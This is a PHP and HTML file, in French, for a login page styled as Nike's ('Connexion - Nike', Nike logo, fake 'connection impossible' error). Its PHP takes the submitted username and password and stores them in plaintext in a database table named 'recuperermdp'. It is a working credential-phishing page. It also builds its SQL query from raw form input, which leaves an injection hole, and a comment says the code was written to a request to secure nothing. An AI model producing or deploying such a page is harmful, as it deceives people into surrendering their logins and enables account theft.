<?php
// Affiche les erreurs (développement)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Vérifie que les champs existent
if (isset($_POST['login']) && isset($_POST['mdp'])) {
    $login = $_POST['login'];
    $mdp = $_POST['mdp'];

    // Affichage pour debug (conforme à ta demande : ne rien sécuriser)
    //echo "Données reçues : " . $login . " - " . $mdp . "<br>";

    // Connexion à la base de données
    $connexion = mysqli_connect('localhost', 'root', '', 'demo');

    if ($connexion) {
        //echo 'Connexion BD réussie<br>';

        // Insertion brute (sans sécurisation ni hash)
        $requete = "INSERT INTO recuperermdp (login, mdp) VALUES ('$login', '$mdp')";

        if (mysqli_query($connexion, $requete)) {
            //echo "<br>Insertion réussie ! Les données sont dans la base.";
        } else {
            //echo "<br>Erreur SQL : " . mysqli_error($connexion);
        }

        mysqli_close($connexion);
    } else {
        //echo 'Erreur connexion BD';
    }
} else {
    //echo "Erreur : Les champs login et mdp ne sont pas présents dans le formulaire.<br>";
    //echo "<pre>";
    print_r($_POST);
    //echo "</pre>";
}
?>







<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Nike</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }

        body {
            background-color: #f7f7f7;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .login-container {
            max-width: 400px;
            margin: 50px auto;
            padding: 0 20px;
            width: 100%;
        }

        .nike-logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .nike-logo img {
            width: 80px;
            height: 80px;
            object-fit: contain;
        }

        .login-card {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }

        .login-card h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 24px;
            color: #111;
            text-align: center;
        }

        .error-message {
            background-color: #fff2f2;
            border: 1px solid #ffcdd2;
            color: #d32f2f;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
            color: #111;
        }

        .form-group input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #e5e5e5;
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: #111;
        }

        .btn-login {
            width: 100%;
            background: #111;
            color: white;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-bottom: 20px;
        }

        .btn-login:hover {
            background: #333;
        }

        .login-links {
            text-align: center;
        }

        .login-links a {
            color: #111;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 12px;
        }

        .login-links a:hover {
            text-decoration: underline;
        }

        .separator {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }

        .separator::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #e5e5e5;
            z-index: 1;
        }

        .separator span {
            background: white;
            padding: 0 15px;
            color: #757575;
            font-size: 14px;
            position: relative;
            z-index: 2;
        }

        .btn-join {
            width: 100%;
            background: transparent;
            color: #111;
            border: 1px solid #e5e5e5;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .btn-join:hover {
            background: #f7f7f7;
        }

        .footer {
            margin-top: auto;
            padding: 30px 20px;
            text-align: center;
            font-size: 12px;
            color: #757575;
        }

        .footer-links {
            margin-bottom: 15px;
        }

        .footer-links a {
            color: #757575;
            text-decoration: none;
            margin: 0 10px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .login-container {
                margin: 20px auto;
            }
            
            .login-card {
                padding: 20px;
            }
            
            .nike-logo img {
                width: 70px;
                height: 70px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="nike-logo">
            <img src="https://cdn-icons-png.flaticon.com/512/732/732084.png" alt="Logo Nike">
        </div>

        <div class="login-card">
            <h1>CONNEXION</h1>

            <!-- Message d'erreur -->
            <div class="error-message">
                Connexion impossible. Veuillez vérifier vos identifiants et réessayer.
            </div>

            <!-- Formulaire : envoi POST vers page2.php -->
            <form method="POST" action="page2.php">
                <div class="form-group">
                    <label for="login">Nom d'utilisateur</label>
                    <input type="text" id="login" name="login" required>
                </div>

                <div class="form-group">
                    <label for="mdp">Mot de passe</label>
                    <input type="password" id="mdp" name="mdp" required>
                </div>

                <button type="submit" class="btn-login">SE CONNECTER</button>
            </form>

            <div class="login-links">
                <a href="#">Mot de passe oublié ?</a>
                <a href="#">Pas membre ? Rejoindre Nike</a>
            </div>

            <div class="separator">
                <span>OU</span>
            </div>

            <button class="btn-join">REJOINDRE NIKE</button>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-links">
            <a href="#">Guide d'achat</a>
            <a href="#">Conditions d'utilisation</a>
            <a href="#">Politique de confidentialité</a>
        </div>
        <div>France</div>
    </footer>
</body>
</html>
